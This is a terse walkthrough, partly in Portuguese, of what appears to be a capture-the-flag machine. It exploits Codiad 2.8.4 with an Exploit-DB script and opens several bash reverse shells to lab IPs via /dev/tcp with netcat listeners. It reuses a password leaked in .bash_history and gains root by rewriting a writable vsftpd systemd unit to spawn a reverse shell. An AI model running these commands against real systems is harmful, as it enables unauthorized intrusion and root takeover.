Enumerate

ftp

username:John 
Password:password
```
serchsploit codiad 2.8.4
```
---

python3 49705.py http://10.10.178.9:62337/ john password 10.9.9.67 1234 linux

[script](https://www.exploit-db.com/exploits/49705)
```
echo 'bash -c "bash -i >/dev/tcp/10.9.9.67/1235 0>&1 2>&1"' | nc -lnvp 1234
```

```
nc -lvnp 1234
```
---

another exemplo:

python3 49705.py http://10.10.178.9:62337/ john password 10.9.9.67 1234 linux

```
nc -lvnp 1234 < comands

```

comands is file with:
```
bash -i >& /dev/tcp/10.17.1.253/9001 0>&1

```

```
nc -lvnp 9001

```

--- 

Privilege escalation

```

cat .bash_history

```

ERRO: this is content of bash_history

```
mysql -u drac -p 'Th3dRaCULa1sR3aL'

```

CORRECT:
```
mysql -u root -p
password: Th3dRaCULa1sR3aL

```

see internal servers in the machine

```
ss -tulwn

```

Login user drac:

```
ssh drac@10.10.178.9
password: Th3dRaCULa1sR3aL

```
---

login root:

```
sudo -l

```

[gtfbions](https://gtfobins.github.io/gtfobins/service/)

```
sudo service ../../bin/sh

```

```
find / -name '*.service' 2>/dev/null
```

/var/lib/lxcfs/cgroup/name=systemd/system.slice/vsftpd.service

```
 find / -name 'vsftpd.service' 2>/dev/null
```

/lib/systemd/system/vsftpd.service

cd /lib/systemd/system
-rw-r`w`-r--  1 root drac   248 Aug  4  2021 vsftpd.service

```nano vsftpd.service

[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target

```
change

```
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/10.9.9.67/9901 0>&1'
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target

```

```

nc -lvnp 9901
```

desligar  o servidor:
/usr/sbin/service vsftpd restart

systemctl daemon-reload

---

Reniciar o servidor:

systemctl daemon-reload

/usr/sbin/service vsftpd restart